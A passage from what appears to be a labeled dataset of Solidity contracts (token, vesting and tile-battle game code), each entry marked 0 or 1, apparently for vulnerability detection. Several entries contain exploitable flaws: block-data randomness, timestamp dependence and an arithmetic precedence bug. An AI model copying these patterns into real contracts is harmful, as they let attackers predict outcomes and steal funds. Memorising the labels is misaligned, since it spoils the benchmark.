        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);            return _taxedEthereum;        }    }             function buyPrice()         public         view         returns(uint256)    {                 if(tokenSupply_ == 0){            return tokenPriceInitial_ + tokenPriceIncremental_;        } else {            uint256 _ethereum = tokensToEthereum_(1e18);            uint256 _dividends = SafeMath.div(_ethereum, dividendFee_  );            uint256 _taxedEthereum = SafeMath.add(_ethereum, _dividends);            return _taxedEthereum;        }    }             function calculateTokensReceived(uint256 _ethereumToSpend)         public         view         returns(uint256)    {        uint256 _dividends = SafeMath.div(_ethereumToSpend, dividendFee_);        uint256 _taxedEthereum = SafeMath.sub(_ethereumToSpend, _dividends);        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);                return _amountOfTokens;    }             function calculateEthereumReceived(uint256 _tokensToSell)         public         view         returns(uint256)    {        require(_tokensToSell <= tokenSupply_);        uint256 _ethereum = tokensToEthereum_(_tokensToSell);        uint256 _dividends = SafeMath.div(_ethereum, dividendFee_);        uint256 _taxedEthereum = SafeMath.sub(_ethereum, _dividends);        return _taxedEthereum;    }                     function purchaseTokens(uint256 _incomingEthereum, address _referredBy)        antiEarlyWhale(_incomingEthereum)        internal        returns(uint256)    {                 address _customerAddress = msg.sender;        uint256 _undividedDividends = SafeMath.div(_incomingEthereum, dividendFee_);        uint256 _referralBonus = SafeMath.div(_undividedDividends, 4);                            uint256 _dividends = SafeMath.sub(_undividedDividends, _referralBonus);                 _dividends = SafeMath.sub(_dividends, _referralBonus);                                 uint256 _taxedEthereum = SafeMath.sub(_incomingEthereum, _undividedDividends);        uint256 _amountOfTokens = ethereumToTokens_(_taxedEthereum);                 uint256 _fee = _dividends * magnitude;             jackpotCounter += _incomingEthereum;                                                                            require(_amountOfTokens > 0 && (SafeMath.add(_amountOfTokens,tokenSupply_) > tokenSupply_));                         if(                         _referredBy != 0x0000000000000000000000000000000000000000 &&                         _referredBy != _customerAddress &&                                                  tokenBalanceLedger_[_referredBy] >= stakingRequirement        ){                         referralBalance_[_referredBy] = SafeMath.add(referralBalance_[_referredBy], _referralBonus);            jackpot_ = SafeMath.add(jackpot_, _referralBonus);        } else {                                      jackpot_ = SafeMath.add(jackpot_, _referralBonus);            referralBalance_[Master] = SafeMath.add(referralBalance_[Master], _referralBonus);        }                         if(tokenSupply_ > 0){                                     tokenSupply_ = SafeMath.add(tokenSupply_, _amountOfTokens);                          profitPerShare_ += (_dividends * magnitude / (tokenSupply_));                                     _fee = _fee - (_fee-(_amountOfTokens * (_dividends * magnitude / (tokenSupply_))));                } else {                         tokenSupply_ = _amountOfTokens;        }                         tokenBalanceLedger_[_customerAddress] = SafeMath.add(tokenBalanceLedger_[_customerAddress], _amountOfTokens);                                  int256 _updatedPayouts = (int256) ((profitPerShare_ * _amountOfTokens) - _fee);        payoutsTo_[_customerAddress] += _updatedPayouts;                                  onTokenPurchase(_customerAddress, _incomingEthereum, _amountOfTokens, _referredBy);        checkJackpot(msg.sender);                        return _amountOfTokens;    }    function random() private view returns (uint8) {        return uint8(uint256(keccak256(block.timestamp, block.difficulty))%251);    }    function checkJackpot(address _jackpotAddress)        private        returns(uint256)        {                if (jackpotCounter >= jackpotThreshold) {                                                        uint256 winnings = jackpot_;                         referralBalance_[_jackpotAddress] = SafeMath.add(referralBalance_[_jackpotAddress], jackpot_);            jackpot_ = 0;            jackpotCounter = 0;            jackpotThreshold = random() * 1e15 * jackpotFactor;            lastWinner = _jackpotAddress;            onWin(msg.sender, winnings);                        return winnings;        }            }         function ethereumToTokens_(uint256 _ethereum)        internal        view        returns(uint256)    {        uint256 _tokenPriceInitial = tokenPriceInitial_ * 1e18;        uint256 _tokensReceived =          (            (                                 SafeMath.sub(                    (sqrt                        (                            (_tokenPriceInitial**2)                            +                            (2*(tokenPriceIncremental_ * 1e18)*(_ethereum * 1e18))                            +                            (((tokenPriceIncremental_)**2)*(tokenSupply_**2))                            +                            (2*(tokenPriceIncremental_)*_tokenPriceInitial*tokenSupply_)                        )                    ), _tokenPriceInitial                )            )/(tokenPriceIncremental_)        )-(tokenSupply_)        ;          return _tokensReceived;    }              function tokensToEthereum_(uint256 _tokens)        internal        view        returns(uint256)    {        uint256 tokens_ = (_tokens + 1e18);        uint256 _tokenSupply = (tokenSupply_ + 1e18);        uint256 _etherReceived =        (                         SafeMath.sub(                (                    (                        (                            tokenPriceInitial_ +(tokenPriceIncremental_ * (_tokenSupply/1e18))                        )-tokenPriceIncremental_                    )*(tokens_ - 1e18)                ),(tokenPriceIncremental_*((tokens_**2-tokens_)/1e18))/2            )        /1e18);        return _etherReceived;    }                      function sqrt(uint x) internal pure returns (uint y) {        uint z = (x + 1) / 2;        y = x;        while (z < y) {            y = z;            z = (x / z + z) / 2;        }    }} library SafeMath {         function mul(uint256 a, uint256 b) internal pure returns (uint256) {        if (a == 0) {            return 0;        }        uint256 c = a * b;        assert(c / a == b);        return c;    }         function div(uint256 a, uint256 b) internal pure returns (uint256) {                 uint256 c = a / b;                 return c;    }         function sub(uint256 a, uint256 b) internal pure returns (uint256) {        assert(b <= a);        return a - b;    }         function add(uint256 a, uint256 b) internal pure returns (uint256) {        uint256 c = a + b;        assert(c >= a);        return c;    }}
1<CODESPLIT>contract CrowdDevAllocation {    mapping(uint => bool) public unlocked;    mapping(uint => uint) public unlock_times;    mapping(uint => uint) unlock_values;    function unlock(uint part) {        if (unlocked[part] == true || block.timestamp < unlock_times[part] || unlock_values[part] == 0) revert();        unlocked[part] = true;        return;    }}
1<CODESPLIT>contract TUINETWORK is StandardToken{    string public name = "TUINETWORK";    string public symbol = "TUI";    uint public decimals = 8 ;       uint public INITIAL_SUPPLY =  1680000000000000000;        uint public constant ALLOCATION_LOCK_END_TIMESTAMP = 1559347200;    address public constant TUI_ADDRESS = 0xCE08f414D107Fd863a3EAbb9817E6F85B81358ab;    uint public constant    TUI_ALLOCATION = 1000000000000000000;        function TUINETWORK()    {                totalSupply = INITIAL_SUPPLY;               balances[msg.sender] = totalSupply;               balances[msg.sender] -= TUI_ALLOCATION;               balances[TUI_ADDRESS]   = TUI_ALLOCATION;          }    function isAllocationLocked(address _spender) constant returns (bool)    {        return inAllocationLockPeriod() && isTeamMember(_spender);    }    function inAllocationLockPeriod() constant returns (bool)    {        return (block.timestamp < ALLOCATION_LOCK_END_TIMESTAMP);    }    function isTeamMember(address _spender) constant returns (bool)    {        return _spender == TUI_ADDRESS  ;    }        function approve(address spender, uint tokens)    {        if (isAllocationLocked(spender))        {            throw;        }        else        {            super.approve(spender, tokens);        }    }    function transfer(address to, uint tokens) onlyPayloadSize(2 * 32)    {        if (isAllocationLocked(to))        {            throw;        }        else        {            super.transfer(to, tokens);        }    }    function transferFrom(address from, address to, uint tokens) onlyPayloadSize(3 * 32)    {        if (isAllocationLocked(from) || isAllocationLocked(to))        {            throw;        }        else        {            super.transferFrom(from, to, tokens);        }    }}
1<CODESPLIT>contract PartialBasic {  uint256 public constant BASE_REWARD = 20000 ether;  uint256 private constant PRECISION = 10**18;  uint256 public totalNodes;  uint256 private rewardTimestamp;  function rewardPerNode() public view returns (uint256) {    uint256 totalDays = block.timestamp - (rewardTimestamp) * (PRECISION) / (1 days);    uint256 newReward = BASE_REWARD * (totalDays) / (PRECISION) / (totalNodes);    return totalDays + (newReward);  }}
1<CODESPLIT>contract BWService {    using SafeMath for uint256;    address private owner;    address private bw;    address private bwMarket;    BWData private bwData;    uint private seed = 42;    uint private WITHDRAW_FEE = 5; // 5%    uint private ATTACK_FEE = 5; // 5%    uint private ATTACK_BOOST_CAP = 300; // 300%    uint private DEFEND_BOOST_CAP = 300; // 300%    uint private ATTACK_BOOST_MULTIPLIER = 100; // 100%    uint private DEFEND_BOOST_MULTIPLIER = 100; // 100%    mapping (uint16 => address) private localGames;        modifier isOwner {        if (msg.sender != owner) {            revert();        }        _;    }      modifier isValidCaller {        if (msg.sender != bw && msg.sender != bwMarket) {            revert();        }        _;    }    event TileClaimed(uint16 tileId, address newClaimer, uint priceInWei, uint creationTime);    event TileFortified(uint16 tileId, address claimer, uint addedValueInWei, uint priceInWei, uint fortifyTime); // Sent when a user fortifies an existing claim by bumping its value.    event TileAttackedSuccessfully(uint16 tileId, address attacker, uint attackAmount, uint totalAttackAmount, address defender, uint defendAmount, uint totalDefendAmount, uint attackRoll, uint attackTime); // Sent when a user successfully attacks a tile.        event TileDefendedSuccessfully(uint16 tileId, address attacker, uint attackAmount, uint totalAttackAmount, address defender, uint defendAmount, uint totalDefendAmount, uint attackRoll, uint defendTime); // Sent when a user successfully defends a tile when attacked.        event BlockValueMoved(uint16 sourceTileId, uint16 destTileId, address owner, uint movedBlockValue, uint postSourceValue, uint postDestValue, uint moveTime); // Sent when a user buys a tile from another user, by accepting a tile offer    event UserBattleValueUpdated(address userAddress, uint battleValue, bool isWithdraw);    constructor(address _bwData) public {        bwData = BWData(_bwData);        owner = msg.sender;    }    function () payable public {        revert();    }    function kill() public isOwner {        selfdestruct(owner);    }    function setValidBwCaller(address _bw) public isOwner {        bw = _bw;    }        function setValidBwMarketCaller(address _bwMarket) public isOwner {        bwMarket = _bwMarket;    }    function setWithdrawFee(uint _feePercentage) public isOwner {        WITHDRAW_FEE = _feePercentage;    }    function setAttackFee(uint _feePercentage) public isOwner {        ATTACK_FEE = _feePercentage;    }    function setAttackBoostMultipler(uint _multiplierPercentage) public isOwner {        ATTACK_BOOST_MULTIPLIER = _multiplierPercentage;    }    function setDefendBoostMultiplier(uint _multiplierPercentage) public isOwner {        DEFEND_BOOST_MULTIPLIER = _multiplierPercentage;    }    function setAttackBoostCap(uint _capPercentage) public isOwner {        ATTACK_BOOST_CAP = _capPercentage;    }    function setDefendBoostCap(uint _capPercentage) public isOwner {        DEFEND_BOOST_CAP = _capPercentage;    }    function storeInitialClaim(address _msgSender, uint16[] _claimedTileIds, uint _claimAmount, bool _useBattleValue) public isValidCaller {        uint tileCount = _claimedTileIds.length;        require(tileCount > 0);        require(_claimAmount >= 1 finney * tileCount); // ensure enough funds paid for all tiles        require(_claimAmount % tileCount == 0); // ensure payment is an even multiple of number of tiles claimed        uint valuePerBlockInWei = _claimAmount.div(tileCount); // Due to requires above this is guaranteed to be an even number        require(valuePerBlockInWei >= 5 finney);        if (_useBattleValue) {            subUserBattleValue(_msgSender, _claimAmount, false);          }        addGlobalBlockValueBalance(_claimAmount);        uint16 tileId;        bool isNewTile;        for (uint16 i = 0; i < tileCount; i++) {            tileId = _claimedTileIds[i];            isNewTile = bwData.isNewTile(tileId); // Is length 0 if first time purchased            require(isNewTile); // Can only claim previously unclaimed tiles.            emit TileClaimed(tileId, _msgSender, valuePerBlockInWei, block.timestamp);            bwData.storeClaim(tileId, _msgSender, valuePerBlockInWei);        }    }    function fortifyClaims(address _msgSender, uint16[] _claimedTileIds, uint _fortifyAmount, bool _useBattleValue) public isValidCaller {        uint tileCount = _claimedTileIds.length;        require(tileCount > 0);        address(this).balance.add(_fortifyAmount); // prevent overflow with SafeMath        require(_fortifyAmount % tileCount == 0); // ensure payment is an even multiple of number of tiles fortified        uint addedValuePerTileInWei = _fortifyAmount.div(tileCount); // Due to requires above this is guaranteed to be an even number        require(_fortifyAmount >= 1 finney * tileCount); // ensure enough funds paid for all tiles        address claimer;        uint blockValue;        for (uint16 i = 0; i < tileCount; i++) {            (claimer, blockValue) = bwData.getTileClaimerAndBlockValue(_claimedTileIds[i]);            require(claimer != 0); // Can't do this on never-owned tiles            require(claimer == _msgSender); // Only current claimer can fortify claim            if (_useBattleValue) {                subUserBattleValue(_msgSender, addedValuePerTileInWei, false);            }                        fortifyClaim(_msgSender, _claimedTileIds[i], addedValuePerTileInWei);        }    }    function fortifyClaim(address _msgSender, uint16 _claimedTileId, uint _fortifyAmount) private {        uint blockValue;        uint sellPrice;        (blockValue, sellPrice) = bwData.getCurrentBlockValueAndSellPriceForTile(_claimedTileId);        uint updatedBlockValue = blockValue.add(_fortifyAmount);        emit TileFortified(_claimedTileId, _msgSender, _fortifyAmount, updatedBlockValue, block.timestamp);                bwData.updateTileBlockValue(_claimedTileId, updatedBlockValue);        addGlobalBlockValueBalance(_fortifyAmount);    }    function random(uint _upper) private returns (uint)  {        seed = uint(keccak256(blockhash(block.number - 1), block.coinbase, block.timestamp, seed, address(0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE).balance));        return seed % _upper;    }    function attackTile(address _msgSender, uint16 _tileId, uint _attackAmount, bool _useBattleValue) public isValidCaller {        require(_attackAmount >= 1 finney);         // Don't allow attacking with less than one base tile price.        require(_attackAmount % 1 finney == 0);        address claimer;        uint blockValue;        (claimer, blockValue) = bwData.getTileClaimerAndBlockValue(_tileId);                require(claimer != 0); // Can't do this on never-owned tiles        require(claimer != _msgSender); // Can't attack one's own tiles        require(claimer != owner); // Can't attack owner's tiles because it is used for raffle.        uint attackBoost;        uint defendBoost;        (attackBoost, defendBoost) = bwData.calculateBattleBoost(_tileId, _msgSender, claimer);        attackBoost = attackBoost.mul(ATTACK_BOOST_MULTIPLIER).div(100);        defendBoost = defendBoost.mul(DEFEND_BOOST_MULTIPLIER).div(100);                if (attackBoost > _attackAmount.mul(ATTACK_BOOST_CAP).div(100)) {            attackBoost = _attackAmount.mul(ATTACK_BOOST_CAP).div(100);        }        if (defendBoost > blockValue.mul(DEFEND_BOOST_CAP).div(100)) {            defendBoost = blockValue.mul(DEFEND_BOOST_CAP).div(100);        }        uint totalAttackAmount = _attackAmount.add(attackBoost);        uint totalDefendAmount = blockValue.add(defendBoost);        require(totalAttackAmount.div(10) <= totalDefendAmount); // Disallow attacks with more than 1000% of defendAmount        require(totalAttackAmount >= totalDefendAmount.div(10)); // Disallow attacks with less than 10% of defendAmount        uint attackFeeAmount = _attackAmount.mul(ATTACK_FEE).div(100);        uint attackAmountAfterFee = _attackAmount.sub(attackFeeAmount);                updateFeeBalance(attackFeeAmount);        uint attackRoll = random(totalAttackAmount.add(totalDefendAmount)); // This is where the excitement happens!        if (attackRoll > totalDefendAmount) {            bwData.setClaimerForTile(_tileId, _msgSender);            if (_useBattleValue) {                addUserBattleValue(_msgSender, attackAmountAfterFee); // Don't include boost here!                subUserBattleValue(_msgSender, attackAmountAfterFee, false);            } else {                addUserBattleValue(_msgSender, attackAmountAfterFee); // Don't include boost here!            }            addUserBattleValue(claimer, 0);            bwData.updateTileTimeStamp(_tileId);            emit TileAttackedSuccessfully(_tileId, _msgSender, attackAmountAfterFee, totalAttackAmount, claimer, blockValue, totalDefendAmount, attackRoll, block.timestamp);        } else {            bwData.setClaimerForTile(_tileId, claimer); //should be old owner            if (_useBattleValue) {                subUserBattleValue(_msgSender, attackAmountAfterFee, false); // Don't include boost here!            }            addUserBattleValue(claimer, attackAmountAfterFee); // Don't include boost here!                        emit TileDefendedSuccessfully(_tileId, _msgSender, attackAmountAfterFee, totalAttackAmount, claimer, blockValue, totalDefendAmount, attackRoll, block.timestamp);        }    }    function updateFeeBalance(uint attackFeeAmount) private {        uint feeBalance = bwData.getFeeBalance();        feeBalance = feeBalance.add(attackFeeAmount);        bwData.setFeeBalance(feeBalance);    }    function moveBlockValue(address _msgSender, uint8 _xSource, uint8 _ySource, uint8 _xDest, uint8 _yDest, uint _moveAmount) public isValidCaller {        uint16 sourceTileId = BWUtility.toTileId(_xSource, _ySource);        uint16 destTileId = BWUtility.toTileId(_xDest, _yDest);        address sourceTileClaimer;        address destTileClaimer;        uint sourceTileBlockValue;        uint destTileBlockValue;        (sourceTileClaimer, sourceTileBlockValue) = bwData.getTileClaimerAndBlockValue(sourceTileId);        (destTileClaimer, destTileBlockValue) = bwData.getTileClaimerAndBlockValue(destTileId);        uint newBlockValue = sourceTileBlockValue.sub(_moveAmount);        require(newBlockValue == 0 || newBlockValue >= 5 finney);        require(sourceTileClaimer == _msgSender);        require(destTileClaimer == _msgSender);        require(_moveAmount >= 1 finney); // Can't be less        require(_moveAmount % 1 finney == 0); // Move amount must be in multiples of 1 finney                require(BWUtility.isAdjacent(_xSource, _ySource, _xDest, _yDest));        sourceTileBlockValue = sourceTileBlockValue.sub(_moveAmount);        destTileBlockValue = destTileBlockValue.add(_moveAmount);        if (sourceTileBlockValue == 0) {            bwData.deleteTile(sourceTileId);        } else {            bwData.updateTileBlockValue(sourceTileId, sourceTileBlockValue);            bwData.deleteOffer(sourceTileId); // Offer invalid since block value has changed        }        bwData.updateTileBlockValue(destTileId, destTileBlockValue);        bwData.deleteOffer(destTileId);   // Offer invalid since block value has changed        emit BlockValueMoved(sourceTileId, destTileId, _msgSender, _moveAmount, sourceTileBlockValue, destTileBlockValue, block.timestamp);            }    function verifyAmount(address _msgSender, uint _msgValue, uint _amount, bool _useBattleValue) view public isValidCaller {        if (_useBattleValue) {            require(_msgValue == 0);            require(bwData.getUserBattleValue(_msgSender) >= _amount);        } else {            require(_amount == _msgValue);        }    }    function setLocalGame(uint16 _tileId, address localGameAddress) public isOwner {        localGames[_tileId] = localGameAddress;    }    function getLocalGame(uint16 _tileId) view public isValidCaller returns (address) {        return localGames[_tileId];    }    function withdrawBattleValue(address msgSender, uint _battleValueInWei) public isValidCaller returns (uint) {        uint fee = _battleValueInWei.mul(WITHDRAW_FEE).div(100); // Since we divide by 20 we can never create infinite fractions, so we'll always count in whole wei amounts.        uint amountToWithdraw = _battleValueInWei.sub(fee);        uint feeBalance = bwData.getFeeBalance();        feeBalance = feeBalance.add(fee);        bwData.setFeeBalance(feeBalance);        subUserBattleValue(msgSender, _battleValueInWei, true);        return amountToWithdraw;    }    function addUserBattleValue(address _userId, uint _amount) public isValidCaller {        uint userBattleValue = bwData.getUserBattleValue(_userId);        uint newBattleValue = userBattleValue.add(_amount);        bwData.setUserBattleValue(_userId, newBattleValue); // Don't include boost here!        emit UserBattleValueUpdated(_userId, newBattleValue, false);    }        function subUserBattleValue(address _userId, uint _amount, bool _isWithdraw) public isValidCaller {        uint userBattleValue = bwData.getUserBattleValue(_userId);        require(_amount <= userBattleValue); // Must be less than user's battle value - also implicitly checks that underflow isn't possible        uint newBattleValue = userBattleValue.sub(_amount);        bwData.setUserBattleValue(_userId, newBattleValue); // Don't include boost here!        emit UserBattleValueUpdated(_userId, newBattleValue, _isWithdraw);    }    function addGlobalBlockValueBalance(uint _amount) public isValidCaller {        uint blockValueBalance = bwData.getBlockValueBalance();        bwData.setBlockValueBalance(blockValueBalance.add(_amount));    }    function subGlobalBlockValueBalance(uint _amount) public isValidCaller {        uint blockValueBalance = bwData.getBlockValueBalance();        bwData.setBlockValueBalance(blockValueBalance.sub(_amount));    }    function transferTokens(address _tokenAddress, address _recipient) public isOwner {        ERC20I token = ERC20I(_tokenAddress);        require(token.transfer(_recipient, token.balanceOf(this)));    }}
0<CODESPLIT>contract BWData {    address public owner;    address private bwService;    address private bw;    address private bwMarket;    uint private blockValueBalance = 0;    uint private feeBalance = 0;    uint private BASE_TILE_PRICE_WEI = 1 finney; // 1 milli-ETH.        mapping (address => User) private users; // user address -> user information    mapping (uint16 => Tile) private tiles; // tileId -> list of TileClaims for that particular tile        struct User {        uint creationTime;        bool censored;        uint battleValue;    }    struct Tile {        address claimer;        uint blockValue;        uint creationTime;        uint sellPrice;    // If 0 -> not on marketplace. If > 0 -> on marketplace.    }    struct Boost {        uint8 numAttackBoosts;        uint8 numDefendBoosts;        uint attackBoost;        uint defendBoost;    }    constructor() public {        owner = msg.sender;    }    function () payable public {        revert();    }    function kill() public isOwner {        selfdestruct(owner);    }    modifier isValidCaller {        if (msg.sender != bwService && msg.sender != bw && msg.sender != bwMarket) {            revert();        }        _;    }        modifier isOwner {        if (msg.sender != owner) {            revert();        }        _;    }        function setBwServiceValidCaller(address _bwService) public isOwner {        bwService = _bwService;    }    function setBwValidCaller(address _bw) public isOwner {        bw = _bw;    }    function setBwMarketValidCaller(address _bwMarket) public isOwner {        bwMarket = _bwMarket;    }            function addUser(address _msgSender) public isValidCaller {        User storage user = users[_msgSender];        require(user.creationTime == 0);        user.creationTime = block.timestamp;    }    function hasUser(address _user) view public isValidCaller returns (bool) {        return users[_user].creationTime != 0;    }        function getTile(uint16 _tileId) view public isValidCaller returns (address, uint, uint, uint) {        Tile storage currentTile = tiles[_tileId];        return (currentTile.claimer, currentTile.blockValue, currentTile.creationTime, currentTile.sellPrice);    }        function getTileClaimerAndBlockValue(uint16 _tileId) view public isValidCaller returns (address, uint) {        Tile storage currentTile = tiles[_tileId];        return (currentTile.claimer, currentTile.blockValue);    }        function isNewTile(uint16 _tileId) view public isValidCaller returns (bool) {        Tile storage currentTile = tiles[_tileId];        return currentTile.creationTime == 0;    }        function storeClaim(uint16 _tileId, address _claimer, uint _blockValue) public isValidCaller {        tiles[_tileId] = Tile(_claimer, _blockValue, block.timestamp, 0);    }    function updateTileBlockValue(uint16 _tileId, uint _blockValue) public isValidCaller {        tiles[_tileId].blockValue = _blockValue;    }    function setClaimerForTile(uint16 _tileId, address _claimer) public isValidCaller {        tiles[_tileId].claimer = _claimer;    }    function updateTileTimeStamp(uint16 _tileId) public isValidCaller {        tiles[_tileId].creationTime = block.timestamp;    }        function getCurrentClaimerForTile(uint16 _tileId) view public isValidCaller returns (address) {        Tile storage currentTile = tiles[_tileId];        if (currentTile.creationTime == 0) {            return 0;        }        return currentTile.claimer;    }    function getCurrentBlockValueAndSellPriceForTile(uint16 _tileId) view public isValidCaller returns (uint, uint) {        Tile storage currentTile = tiles[_tileId];        if (currentTile.creationTime == 0) {            return (0, 0);        }        return (currentTile.blockValue, currentTile.sellPrice);    }        function getBlockValueBalance() view public isValidCaller returns (uint){        return blockValueBalance;    }    function setBlockValueBalance(uint _blockValueBalance) public isValidCaller {        blockValueBalance = _blockValueBalance;    }    function getFeeBalance() view public isValidCaller returns (uint) {        return feeBalance;    }    function setFeeBalance(uint _feeBalance) public isValidCaller {        feeBalance = _feeBalance;    }        function getUserBattleValue(address _userId) view public isValidCaller returns (uint) {        return users[_userId].battleValue;    }        function setUserBattleValue(address _userId, uint _battleValue) public  isValidCaller {        users[_userId].battleValue = _battleValue;    }        function verifyAmount(address _msgSender, uint _msgValue, uint _amount, bool _useBattleValue) view public isValidCaller {        User storage user = users[_msgSender];        require(user.creationTime != 0);        if (_useBattleValue) {            require(_msgValue == 0);            require(user.battleValue >= _amount);        } else {            require(_amount == _msgValue);        }    }        function addBoostFromTile(Tile _tile, address _attacker, address _defender, Boost memory _boost) pure private {        if (_tile.claimer == _attacker) {            require(_boost.attackBoost + _tile.blockValue >= _tile.blockValue); // prevent overflow            _boost.attackBoost += _tile.blockValue;            _boost.numAttackBoosts += 1;        } else if (_tile.claimer == _defender) {            require(_boost.defendBoost + _tile.blockValue >= _tile.blockValue); // prevent overflow            _boost.defendBoost += _tile.blockValue;            _boost.numDefendBoosts += 1;        }    }    function calculateBattleBoost(uint16 _tileId, address _attacker, address _defender) view public isValidCaller returns (uint, uint) {        uint8 x;        uint8 y;        (x, y) = BWUtility.fromTileId(_tileId);        Boost memory boost = Boost(0, 0, 0, 0);        if (y != 255) {            if (x != 255) {                addBoostFromTile(tiles[BWUtility.toTileId(x+1, y+1)], _attacker, _defender, boost);            }                        addBoostFromTile(tiles[BWUtility.toTileId(x, y+1)], _attacker, _defender, boost);            if (x != 0) {                addBoostFromTile(tiles[BWUtility.toTileId(x-1, y+1)], _attacker, _defender, boost);            }        }        if (x != 255) {            addBoostFromTile(tiles[BWUtility.toTileId(x+1, y)], _attacker, _defender, boost);        }        if (x != 0) {            addBoostFromTile(tiles[BWUtility.toTileId(x-1, y)], _attacker, _defender, boost);        }        if (y != 0) {            if(x != 255) {                addBoostFromTile(tiles[BWUtility.toTileId(x+1, y-1)], _attacker, _defender, boost);            }            addBoostFromTile(tiles[BWUtility.toTileId(x, y-1)], _attacker, _defender, boost);            if(x != 0) {                addBoostFromTile(tiles[BWUtility.toTileId(x-1, y-1)], _attacker, _defender, boost);            }        }        boost.attackBoost = (boost.attackBoost / 10 * boost.numAttackBoosts);        boost.defendBoost = (boost.defendBoost / 10 * boost.numDefendBoosts);        return (boost.attackBoost, boost.defendBoost);    }        function censorUser(address _userAddress, bool _censored) public isValidCaller {        User storage user = users[_userAddress];        require(user.creationTime != 0);        user.censored = _censored;    }        function deleteTile(uint16 _tileId) public isValidCaller {        delete tiles[_tileId];    }        function setSellPrice(uint16 _tileId, uint _sellPrice) public isValidCaller {        tiles[_tileId].sellPrice = _sellPrice;  //testrpc cannot estimate gas when delete is used.    }    function deleteOffer(uint16 _tileId) public isValidCaller {        tiles[_tileId].sellPrice = 0;  //testrpc cannot estimate gas when delete is used.    }}library SafeMath {  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {    if (a == 0) {      return 0;    }    c = a * b;    assert(c / a == b);    return c;  }  function div(uint256 a, uint256 b) internal pure returns (uint256) {    return a / b;  }  function sub(uint256 a, uint256 b) internal pure returns (uint256) {    assert(b <= a);    return a - b;  }  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {    c = a + b;    assert(c >= a);    return c;  }}interface LocalGameI {    function getBountyBalance() view external returns (uint);    function getTimeLeftToNextCollect(address _claimer, uint _latestClaimTime) view external returns (uint);    function collectBounty(address _msgSender, uint _latestClaimTime, uint _amount) external returns (uint);}
1<CODESPLIT>contract BW {     using SafeMath for uint256;    address public owner;    BWService private bwService;    BWData private bwData;    bool public paused = false;    uint private BV_TO_BP_FEE = 5; // 5%    mapping (uint16 => Prize[]) private prizes; // Use mapping instead of array (key would be a unique priceId) - NO (we want to loop all prices)        struct Prize {        address token; // BWT or CryptoKiities (ERC721)        uint tokenId;         uint startTime; // To be able to add a price before the game starts        uint hodlPeriod; // Amount of seconds you have to own the tile before being able to claim this price. One block is ~15 sec.    }    event PrizeCreated(uint16 tileId,  address token, uint tokenId, uint creationTime, uint startTime, uint hodlPeriod);    event PrizeRemoved(uint16 tileId, address token, uint tokenId, uint removeTime);    event PrizeClaimed(address token, uint tokenId);    function addPrize(uint16 _tileId, address _token, uint _tokenId, uint _startTime, uint _hodlPeriod) public isOwner {        uint startTime = _startTime;        if(startTime < block.timestamp) {            startTime = block.timestamp;        }        prizes[_tileId].push(Prize(_token, _tokenId, startTime, _hodlPeriod));        emit PrizeCreated(_tileId, _token, _tokenId, block.timestamp, startTime, _hodlPeriod);    }    function removePrize(uint16 _tileId, address _token, uint _tokenId) public isOwner {        Prize[] storage prizeArr = prizes[_tileId];        require(prizeArr.length > 0);        for(uint idx = 0; idx < prizeArr.length; ++idx) {            if(prizeArr[idx].tokenId == _tokenId && prizeArr[idx].token == _token) {                delete prizeArr[idx];                emit PrizeRemoved(_tileId, _token, _tokenId, block.timestamp);            }        }    }    function claimPrize(address _tokenAddress, uint16 _tileId) public isNotPaused isNotContractCaller {        ERC721 token = ERC721(_tokenAddress);        Prize[] storage prizeArr = prizes[_tileId];        require(prizeArr.length > 0);        address claimer;        uint blockValue;        uint lastClaimTime;        uint sellPrice;        (claimer, blockValue, lastClaimTime, sellPrice) = bwData.getTile(_tileId);        require(lastClaimTime != 0 && claimer == msg.sender);        for(uint idx = 0; idx < prizeArr.length; ++idx) {            if(prizeArr[idx].startTime.add(prizeArr[idx].hodlPeriod) <= block.timestamp                && lastClaimTime.add(prizeArr[idx].hodlPeriod) <= block.timestamp) {                uint tokenId = prizeArr[idx].tokenId;                address tokenOwner = token.ownerOf(tokenId);                delete prizeArr[idx];                token.safeTransferFrom(tokenOwner, msg.sender, tokenId); //Will revert if token does not exists                emit PrizeClaimed(_tokenAddress, tokenId);            }        }    }    modifier isOwner {        if (msg.sender != owner) {            revert();        }        _;    }    modifier isNotPaused {        if (paused) {            revert();        }        _;    }    modifier isNotContractCaller {        require(msg.sender == tx.origin);        _;    }    event UserCreated(address userAddress, bytes32 name, bytes imageUrl, bytes32 tag, bytes32 homeUrl, uint creationTime, address invitedBy);    event UserCensored(address userAddress, bool isCensored);    event TransferTileFromOwner(uint16 tileId, address seller, address buyer, uint acceptTime); // Sent when a user buys a tile from another user, by accepting a tile offer    event UserUpdated(address userAddress, bytes32 name, bytes imageUrl, bytes32 tag, bytes32 homeUrl, uint updateTime);    event TileRetreated(uint16 tileId, address owner, uint amount, uint newBlockValue, uint retreatTime);    event BountyCollected(uint tile, address userAddress, uint amount, uint amountCollected, uint collectedTime, uint latestClaimTime);    constructor(address _bwService, address _bwData) public {        bwService = BWService(_bwService);        bwData = BWData(_bwData);        owner = msg.sender;    }    function () payable public isOwner {    }    function claimTilesForNewUser(bytes32 _name, bytes _imageUrl, bytes32 _tag, bytes32 _homeUrl, uint16[] _claimedTileIds, address _invitedBy) payable public isNotPaused isNotContractCaller {        bwData.addUser(msg.sender);        emit UserCreated(msg.sender, _name, _imageUrl, _tag, _homeUrl, block.timestamp, _invitedBy);        bwService.storeInitialClaim(msg.sender, _claimedTileIds, msg.value, false);    }    function claimTilesForExistingUser(uint16[] _claimedTileIds, uint _claimAmount, bool _useBattleValue) payable public isNotPaused isNotContractCaller {        bwService.verifyAmount(msg.sender, msg.value, _claimAmount, _useBattleValue);        bwService.storeInitialClaim(msg.sender, _claimedTileIds, _claimAmount, _useBattleValue);    }    function updateUser(bytes32 _name, bytes _imageUrl, bytes32 _tag, bytes32 _homeUrl) public isNotPaused isNotContractCaller {        require(bwData.hasUser(msg.sender));        emit UserUpdated(msg.sender, _name, _imageUrl, _tag, _homeUrl, block.timestamp);    }        function fortifyClaims(uint16[] _claimedTileIds, uint _fortifyAmount, bool _useBattleValue) payable public isNotPaused isNotContractCaller {        bwService.verifyAmount(msg.sender, msg.value, _fortifyAmount, _useBattleValue);        bwService.fortifyClaims(msg.sender, _claimedTileIds, _fortifyAmount, _useBattleValue);    }    function attackTileForNewUser(uint16 _tileId, bytes32 _name, bytes _imageUrl, bytes32 _tag, bytes32 